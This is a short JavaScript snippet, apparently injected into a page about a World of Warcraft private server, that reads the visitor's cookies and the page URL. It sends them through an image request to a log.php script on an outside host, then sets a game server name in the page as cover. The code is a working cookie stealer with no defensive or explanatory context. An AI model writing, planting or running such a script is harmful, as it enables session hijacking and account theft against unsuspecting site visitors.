//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;

//Fix the new text error
jQuery("id#showgame").html("(Elysium) Nostalrius - PVP");